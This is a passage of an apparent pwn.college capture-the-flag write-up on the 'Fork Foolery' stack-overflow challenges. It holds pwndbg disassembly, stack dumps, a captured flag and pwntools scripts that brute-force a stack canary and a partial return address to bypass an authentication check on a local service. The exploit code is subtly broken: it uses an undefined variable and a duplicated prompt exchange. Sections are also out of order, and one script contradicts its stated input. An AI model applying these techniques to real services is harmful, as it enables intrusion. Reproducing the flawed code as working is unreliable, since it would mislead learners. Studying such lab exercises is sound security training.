+| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | d0 87 ae a7 a4 64 00 00 | 0x000064a4a7ae87d0 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae87d0.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb400.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+You win! Here is your flag:
+pwn.college{E-BMCb-mkeLzxLOaK3n1Bln9zn2.01NxMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Fork Foolery (Hard)
+
+```
+hacker@program-security~fork-foolery-hard:/$ /challenge/fork-foolery-hard 
+###
+### Welcome to /challenge/fork-foolery-hard!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited sequential connections.
+```
+
+We need the following in order to craft an exploit:
+
+- [ ] Location of the buffer
+- [ ] Location of the canary
+- [ ] Location of stored return address to `main()`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x00000000000011a0  __cxa_finalize@plt
+0x00000000000011b0  putchar@plt
+0x00000000000011c0  __errno_location@plt
+0x00000000000011d0  puts@plt
+0x00000000000011e0  setsockopt@plt
+0x00000000000011f0  write@plt
+0x0000000000001200  __stack_chk_fail@plt
+0x0000000000001210  htons@plt
+0x0000000000001220  dup2@plt
+0x0000000000001230  printf@plt
+0x0000000000001240  geteuid@plt
+0x0000000000001250  close@plt
+0x0000000000001260  read@plt
+0x0000000000001270  listen@plt
+0x0000000000001280  setvbuf@plt
+0x0000000000001290  bind@plt
+0x00000000000012a0  open@plt
+0x00000000000012b0  accept@plt
+0x00000000000012c0  __isoc99_scanf@plt
+0x00000000000012d0  exit@plt
+0x00000000000012e0  strerror@plt
+0x00000000000012f0  wait@plt
+0x0000000000001300  fork@plt
+0x0000000000001310  socket@plt
+0x0000000000001320  _start
+0x0000000000001350  deregister_tm_clones
+0x0000000000001380  register_tm_clones
+0x00000000000013c0  __do_global_dtors_aux
+0x0000000000001400  frame_dummy
+0x0000000000001409  bin_padding
+0x0000000000002029  win_authed
+0x0000000000002146  challenge
+0x0000000000002256  main
+0x00000000000024a0  __libc_csu_init
+0x0000000000002510  __libc_csu_fini
+0x0000000000002518  _fini
+```
+
+#### `win_authed()` 
+
+```
+pwndbg> disassemble win_authed 
+Dump of assembler code for function win_authed:
+   0x0000000000002029 <+0>:     endbr64
+   0x000000000000202d <+4>:     push   rbp
+   0x000000000000202e <+5>:     mov    rbp,rsp
+   0x0000000000002031 <+8>:     sub    rsp,0x10
+   0x0000000000002035 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000002038 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x000000000000203f <+22>:    jne    0x2143 <win_authed+282>
+   0x0000000000002045 <+28>:    lea    rdi,[rip+0xfbc]        # 0x3008
+
+# ---- snip ----
+
+   0x0000000000002143 <+282>:   nop
+   0x0000000000002144 <+283>:   leave
+   0x0000000000002145 <+284>:   ret
+End of assembler dump.
+```
+
+- [ ] Location of the buffer
+- [ ] Location of the canary
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000002146 <+0>:     endbr64
+   0x000000000000214a <+4>:     push   rbp
+   0x000000000000214b <+5>:     mov    rbp,rsp
+   0x000000000000214e <+8>:     sub    rsp,0x70
+   0x0000000000002152 <+12>:    mov    DWORD PTR [rbp-0x54],edi
+   0x0000000000002155 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x0000000000002159 <+19>:    mov    QWORD PTR [rbp-0x68],rdx
+   0x000000000000215d <+23>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000002166 <+32>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000216a <+36>:    xor    eax,eax
+   0x000000000000216c <+38>:    mov    QWORD PTR [rbp-0x30],0x0
+   0x0000000000002174 <+46>:    mov    QWORD PTR [rbp-0x28],0x0
+   0x000000000000217c <+54>:    mov    QWORD PTR [rbp-0x20],0x0
+   0x0000000000002184 <+62>:    mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000000218c <+70>:    mov    QWORD PTR [rbp-0x10],0x0
+   0x0000000000002194 <+78>:    lea    rax,[rbp-0x30]
+   0x0000000000002198 <+82>:    mov    QWORD PTR [rbp-0x38],rax
+   0x000000000000219c <+86>:    mov    QWORD PTR [rbp-0x40],0x0
+   0x00000000000021a4 <+94>:    lea    rdi,[rip+0xf61]        # 0x310c
+   0x00000000000021ab <+101>:   mov    eax,0x0
+   0x00000000000021b0 <+106>:   call   0x1230 <printf@plt>
+   0x00000000000021b5 <+111>:   lea    rax,[rbp-0x40]
+   0x00000000000021b9 <+115>:   mov    rsi,rax
+   0x00000000000021bc <+118>:   lea    rdi,[rip+0xf58]        # 0x311b
+   0x00000000000021c3 <+125>:   mov    eax,0x0
+   0x00000000000021c8 <+130>:   call   0x12c0 <__isoc99_scanf@plt>
+   0x00000000000021cd <+135>:   mov    rax,QWORD PTR [rbp-0x40]
+   0x00000000000021d1 <+139>:   mov    rsi,rax
+   0x00000000000021d4 <+142>:   lea    rdi,[rip+0xf45]        # 0x3120
+   0x00000000000021db <+149>:   mov    eax,0x0
+   0x00000000000021e0 <+154>:   call   0x1230 <printf@plt>
+   0x00000000000021e5 <+159>:   mov    rdx,QWORD PTR [rbp-0x40]
+   0x00000000000021e9 <+163>:   mov    rax,QWORD PTR [rbp-0x38]
+   0x00000000000021ed <+167>:   mov    rsi,rax
+   0x00000000000021f0 <+170>:   mov    edi,0x0
+   0x00000000000021f5 <+175>:   call   0x1260 <read@plt>
+   0x00000000000021fa <+180>:   mov    DWORD PTR [rbp-0x44],eax
+   0x00000000000021fd <+183>:   cmp    DWORD PTR [rbp-0x44],0x0
+   0x0000000000002201 <+187>:   jns    0x222f <challenge+233>
+   0x0000000000002203 <+189>:   call   0x11c0 <__errno_location@plt>
+   0x0000000000002208 <+194>:   mov    eax,DWORD PTR [rax]
+   0x000000000000220a <+196>:   mov    edi,eax
+   0x000000000000220c <+198>:   call   0x12e0 <strerror@plt>
+   0x0000000000002211 <+203>:   mov    rsi,rax
+   0x0000000000002214 <+206>:   lea    rdi,[rip+0xf2d]        # 0x3148
+   0x000000000000221b <+213>:   mov    eax,0x0
+   0x0000000000002220 <+218>:   call   0x1230 <printf@plt>
+   0x0000000000002225 <+223>:   mov    edi,0x1
+   0x000000000000222a <+228>:   call   0x12d0 <exit@plt>
+   0x000000000000222f <+233>:   lea    rdi,[rip+0xf36]        # 0x316c
+   0x0000000000002236 <+240>:   call   0x11d0 <puts@plt>
+   0x000000000000223b <+245>:   mov    eax,0x0
+   0x0000000000002240 <+250>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000002244 <+254>:   xor    rcx,QWORD PTR fs:0x28
+   0x000000000000224d <+263>:   je     0x2254 <challenge+270>
+   0x000000000000224f <+265>:   call   0x1200 <__stack_chk_fail@plt>
+   0x0000000000002254 <+270>:   leave
+   0x0000000000002255 <+271>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+175` where the call to `read@plt` is made.
+
+```
+pwndbg> break *(challenge+175)
+Breakpoint 1 at 0x21f5
+```
+
+```
+pwndbg> run
+Starting program: /challenge/fork-foolery-hard 
+###
+### Welcome to /challenge/fork-foolery-hard!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited sequential connections.
+```
+
+The challenge needs some input to proceed. Let's use our hello world script from last challenge.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+OFFSET_TO_CANARY = 72 
+
+context.log_level = 'info'
+
+# 1. Connect
+p = remote(HOST, PORT)
+
+# 2. Handle Size Prompt
+p.recvuntil(b"Payload size: ")
+# 72 bytes of padding + 1 byte for the canary null
+p.sendline(b"73")
+
+# 3. Send Payload
+p.recvuntil(b"bytes)!")
+# Payload: Padding followed by the first byte of the canary (\x00)
+payload = b"A" * OFFSET_TO_CANARY + b"\x00"
+p.send(payload)
+
+# 4. Print Response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-hard:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (1B)
+[*] Closed connection to 127.0.0.1 port 1337
+```
+
+Looking back at Pwndbg.
+
+```
+pwndbg> run
+Starting program: /challenge/fork-foolery-hard 
+###
+### Welcome to /challenge/fork-foolery-hard!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited sequential connections.
+
+[Attaching after process 1229 fork to child process 1946]
+[New inferior 2 (process 1946)]
+[Detaching after fork from parent process 1229]
+[Inferior 1 (process 1229) detached]
+[Switching to process 1946]
+
+Thread 2.1 "fork-foolery-ha" hit Breakpoint 1, 0x00005817ef99a1f5 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd8aa00320 ◂— 0
+ RBX  0x5817ef99a4a0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x49
+ RDI  0
+ RSI  0x7ffd8aa00320 ◂— 0
+ R8   0x24
+ R9   0x24
+ R10  0x5817ef99b13c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5817ef999320 (_start) ◂— endbr64 
+ R13  0x7ffd8aa01490 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd8aa00350 —▸ 0x7ffd8aa013a0 ◂— 0
+ RSP  0x7ffd8aa002e0 —▸ 0x7650459246a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+ RIP  0x5817ef99a1f5 (challenge+175) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5817ef99a1f5 <challenge+175>    call   read@plt                    <read@plt>
+        fd: 0 (socket:[455964966])
+        buf: 0x7ffd8aa00320 ◂— 0
+        nbytes: 0x49
+ 
+   0x5817ef99a1fa <challenge+180>    mov    dword ptr [rbp - 0x44], eax
+   0x5817ef99a1fd <challenge+183>    cmp    dword ptr [rbp - 0x44], 0
+   0x5817ef99a201 <challenge+187>    jns    challenge+233               <challenge+233>
+ 
+   0x5817ef99a203 <challenge+189>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x5817ef99a208 <challenge+194>    mov    eax, dword ptr [rax]
+   0x5817ef99a20a <challenge+196>    mov    edi, eax
+   0x5817ef99a20c <challenge+198>    call   strerror@plt                <strerror@plt>
+ 
+   0x5817ef99a211 <challenge+203>    mov    rsi, rax
+   0x5817ef99a214 <challenge+206>    lea    rdi, [rip + 0xf2d]     RDI => 0x5817ef99b148 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x5817ef99a21b <challenge+213>    mov    eax, 0                 EAX => 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd8aa002e0 —▸ 0x7650459246a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+01:0008│-068 0x7ffd8aa002e8 —▸ 0x7ffd8aa014a8 —▸ 0x7ffd8aa0269a ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-060 0x7ffd8aa002f0 —▸ 0x7ffd8aa01498 —▸ 0x7ffd8aa0267d ◂— '/challenge/fork-foolery-hard'
+03:0018│-058 0x7ffd8aa002f8 ◂— 0x1459204a0
+04:0020│-050 0x7ffd8aa00300 ◂— 0
+05:0028│-048 0x7ffd8aa00308 —▸ 0x7650457c7e93 (_IO_file_overflow+275) ◂— cmp eax, -1
+06:0030│-040 0x7ffd8aa00310 ◂— 0x49 /* 'I' */
+07:0038│-038 0x7ffd8aa00318 —▸ 0x7ffd8aa00320 ◂— 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5817ef99a1f5 challenge+175
+   1   0x5817ef99a476 main+544
+   2   0x76504575b083 __libc_start_main+243
+   3   0x5817ef99934e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7ffd8aa00320`
+- [ ] Location of the canary
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`
+
+Let's get the location of the canary.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffd8aa00360:
+ rip = 0x5817ef99a1f5 in challenge; saved rip = 0x5817ef99a476
+ called by frame at 0x7ffd8aa013b0
+ Arglist at 0x7ffd8aa00350, args: 
+ Locals at 0x7ffd8aa00350, Previous frame's sp is 0x7ffd8aa00360
+ Saved registers:
+  rbp at 0x7ffd8aa00350, rip at 0x7ffd8aa00358
+```
+
+```
+pwndbg> x/10gx $rsi
+0x7ffd8aa00320: 0x0000000000000000      0x0000000000000000
+0x7ffd8aa00330: 0x0000000000000000      0x0000000000000000
+0x7ffd8aa00340: 0x0000000000000000      0x8722780fb62d8a00
+0x7ffd8aa00350: 0x00007ffd8aa013a0      0x00005817ef99a476
+0x7ffd8aa00360: 0x000000000004d2c4      0x00007ffd8aa014a8
+```
+
+- [x] Location of the buffer: `0x7ffd8aa00320`
+- [x] Location of the canary: `0x7ffd8aa00348`
+- [x] Location of stored return address to `main()`: `0x7ffd8aa00358`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`
+
+### Exploit
+
+```py title="~/script.py"
+from pwn import *
+import struct
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+host = '127.0.0.1'
+port = 1337
+
+buffer_addr = 0x7ffd8aa00320
+canary_addr = 0x7ffd8aa00348
+
+offset_to_canary = canary_addr - buffer_addr
+# Target instruction in win_authed() that skips the 0x1337 check
+safe_win_authed_offset = 0x2045 
+
+# --- STAGE 1: BRUTE FORCE CANARY ---
+known_canary = b'\x00'
+print("[*] Stage 1: Brute-forcing Canary byte-by-byte...")
+
+for i in range(7):
+    found_byte = False
+    for byte_guess in range(256):
+        try:
+            p = remote(host, port)
+            p.recvuntil(b"Payload size: ")
+            p.sendline(str(offset_to_canary + 8).encode())
+            
+            p.recvuntil(b"bytes)!")
+            p.sendline(str(offset_to_canary + len(current_guess)).encode())
+            
+            p.recvuntil(b"bytes)!")
+            p.send(b"A" * offset_to_canary + current_guess)
+            
+            output = p.recvall(timeout=0.4)
+            
+            # Oracle: Success if Goodbye is present AND no stack smashing error
+            if b"Goodbye!" in output and b"stack smashing detected" not in output:
+                known_canary += p8(byte_guess)
+                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
+                found_byte = True
+                p.close()
+                break
+            p.close()
+        except EOFError:
+            pass
+
+    if not found_byte:
+        print(f"[!] Failed to leak canary at byte {i+1}.")
+        exit()
+
+leaked_canary_int = u64(known_canary)
+print(f"[*] FINAL LEAKED CANARY: {hex(leaked_canary_int)}")
+
+# --- STAGE 2: BRUTE FORCE RIP (ASLR) ---
+print(f"[*] Stage 2: Starting RIP brute force loop (Target: {hex(safe_win_authed_offset)})")
+attempt = 0
+
+while True:
+    attempt += 1
+    p = None
+    try:
+        p = remote(host, port, timeout=1)
+        p.recvuntil(b"Payload size: ")
+        
+        # 72 (buffer) + 8 (canary) + 8 (rbp) + 2 (partial rip) = 90
+        p.sendline(b"90")
+        p.recvuntil(b"bytes)!")
+        
+        # Build the payload using the canary we just leaked
+        payload = b"A" * offset_to_canary
+        payload += known_canary
+        payload += b"B" * 8
+        payload += struct.pack("<H", safe_win_authed_offset)
+        
+        p.send(payload)
+        
+        output = p.recvall(timeout=1).decode(errors='ignore')
+        
+        if "pwn.college{" in output:
+            print(f"\n[!] SUCCESS on attempt {attempt}!")
+            print(output)
+            break
+        
+        p.close()
+        if attempt % 10 == 0:
+            print(f"[*] RIP Attempt {attempt}...", end='\r')
+            
+    except Exception:
+        if p: p.close()
+        pass
+```
+
+
+
+
+
+
+
+### Brute forcing the canary
+
+Let's overwrite the known `\x00` byte of the canary with a `\x00` to see the program's output.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+OFFSET_TO_CANARY = 72 
+
+context.log_level = 'info'
+
+# 1. Connect
+p = remote(HOST, PORT)
+
+# 2. Handle Size Prompt
+p.recvuntil(b"Payload size: ")
+# 72 bytes of padding + 1 byte for the canary null
+p.sendline(b"73")
+
+# 3. Send Payload
+p.recvuntil(b"bytes)!")
+# Payload: Padding followed by the first byte of the canary (\x00)
+payload = b"A" * OFFSET_TO_CANARY + b"\x00"
+p.send(payload)
+
+# 4. Print Response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (2.57KB)
+[*] Closed connection to 127.0.0.1 port 1337
+
+You sent 73 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae938e.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb400.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+### Goodbye!
+```
+
+Now, let's overwrite the `\x00` byte with a `\x01` byte.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+# OFFSET_TO_CANARY = 72 
+
+context.log_level = 'info'
+
+buffer_addr = 0x7ffd8aa00320
+canary_addr = 0x7ffd8aa00348
+
+OFFSET_TO_CANARY = canary_addr - buffer_addr
+
+# 1. Connect
+p = remote(HOST, PORT)
+
+# 2. Handle Size Prompt
+p.recvuntil(b"Payload size: ")
+# 72 bytes of padding + 1 byte for the canary null
+p.sendline(b"73")
+
+# 3. Send Payload
+p.recvuntil(b"bytes)!")
+# Payload: Padding followed by the first byte of the canary (\x00)
+payload = b"A" * OFFSET_TO_CANARY + b"\x00"
+p.send(payload)
+
+# 4. Print Response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (2.60KB)
+[*] Closed connection to 127.0.0.1 port 1337
+
+You sent 73 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 01 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb401 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae938e.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb401.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+*** stack smashing detected ***: terminated
+```
+
+The string `stack smashing detected` will be our oracle whch tells us if our brute-forced byte is correct.
+
+As for the return address brute force, we already know how to do it. But first we need the offset of the instruction within `win_authed()` which skips the authentication.
